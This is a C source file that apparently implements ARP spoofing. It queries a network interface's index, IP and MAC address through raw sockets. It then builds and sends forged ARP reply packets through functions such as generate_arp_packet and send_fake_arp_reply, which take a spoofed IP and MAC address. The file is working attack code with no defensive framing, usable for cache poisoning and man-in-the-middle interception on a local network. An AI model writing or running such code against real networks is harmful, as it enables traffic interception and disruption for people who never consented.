#include "net.h"
#include <net/if_arp.h>
#include <netinet/ether.h>
#include <stdio.h>
#include <stdlib.h>

struct ether_addr *mac_parser(char *mac_addr) {
  struct ether_addr *ethaddr = NULL;
  ethaddr = ether_aton(mac_addr);
  if (NULL == ethaddr) {
    printf("Invalid Ethernet destination address.\n");
  }
  return ethaddr;
}

IF_DATA* get_if_data(char* if_name){

     IF_DATA* interface_data = (IF_DATA*)malloc(sizeof(IF_DATA));

     struct ifreq ifr;
     int sock_raw_fd;

     if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1){
       perror("socket()");
     }

     bzero(&ifr, sizeof(struct ifreq));

     /*  NIC interface name */
     memcpy(ifr.ifr_name, if_name, strlen(if_name));

     memcpy(interface_data->if_name , if_name,strlen(if_name));

     /*  Get NIC interface index */
     if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1){
       perror("ioctl() get ifindex");
       exit(1);
     }
         
     interface_data->index = ifr.ifr_ifindex;
 
     /*  Get NIC interface IP */
     if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1){
       perror("ioctl() get ip");
       exit(1);
     }
         
     interface_data->ip_addr = ((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr.s_addr;
 
     /*  Get the MAC address of the NIC interface */
     if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr)){
       perror("ioctl() get mac");
       exit(1);
     }
         
     memcpy(interface_data->mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
     return interface_data;
}

struct ether_arp *generate_arp_packet(const unsigned char *src_mac_addr,unsigned int src_ip,unsigned int target_ip_addr,unsigned char *target_mac_addr) {
  struct ether_arp *arp_packet;

  unsigned char dst_mac_addr[ETH_ALEN];

  memcpy(dst_mac_addr, target_mac_addr, ETH_ALEN);

  // /*  IP address translation */  --> 192.168.1.1 --> other form
  // inet_pton(AF_INET, src_ip, &src_in_addr);
  // inet_pton(AF_INET, target_ip_addr, &dst_in_addr);

  /*  The entire arp package */
  arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
  arp_packet->arp_hrd = htons(ARPHRD_ETHER);
  arp_packet->arp_pro = htons(ETHERTYPE_IP);
  arp_packet->arp_hln = ETH_ALEN;
  arp_packet->arp_pln = IP_ADDR_LEN;
  arp_packet->arp_op = htons(ARPOP_REPLY);
  memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
  memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
  memcpy(arp_packet->arp_spa, &src_ip, IP_ADDR_LEN);
  memcpy(arp_packet->arp_tpa, &target_ip_addr, IP_ADDR_LEN);

  return arp_packet;
}

void send_fake_arp_reply(IF_DATA* if_data, unsigned int spoofed_ip,unsigned char *spoofed_mac, unsigned char *target_mac_addr,unsigned int target_ip_addr) {
  struct sockaddr_ll saddr_ll;
  struct ether_header *eth_header;
  struct ether_arp *arp_packet;
  struct ifreq ifr;
  char buf[ETHER_ARP_PACKET_LEN];
  unsigned char src_mac_addr[ETH_ALEN];
  unsigned char dst_mac_addr[ETH_ALEN];
  // memcpy(src_mac_addr, mac_parser(spoofed_mac), ETH_ALEN);  --> if you want to use char* mode for mac
  // memcpy(dst_mac_addr, mac_parser(target_mac_addr), ETH_ALEN);
  memcpy(src_mac_addr, spoofed_mac, ETH_ALEN);
  memcpy(dst_mac_addr, target_mac_addr, ETH_ALEN);

  int sock_raw_fd, ret_len;

  if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("cannot create raw socket");
    exit(0);
  }
  bzero(&saddr_ll, sizeof(struct sockaddr_ll));
  bzero(&ifr, sizeof(struct ifreq));
    
  saddr_ll.sll_ifindex = if_data->index;
  saddr_ll.sll_family = PF_PACKET;


  bzero(buf, ETHER_ARP_PACKET_LEN);
  /*  Fill the ether header */
  eth_header = (struct ether_header *)buf;
  memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
  memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
  eth_header->ether_type = htons(ETHERTYPE_ARP);

  /*  arp package */
  arp_packet = generate_arp_packet(src_mac_addr, spoofed_ip,target_ip_addr,target_mac_addr);
  memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

  /*  send request  */
  ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0,(struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
  if (ret_len < 0){
	  printf("error!!\n");
    exit(1);
  }
    
  close(sock_raw_fd);
}

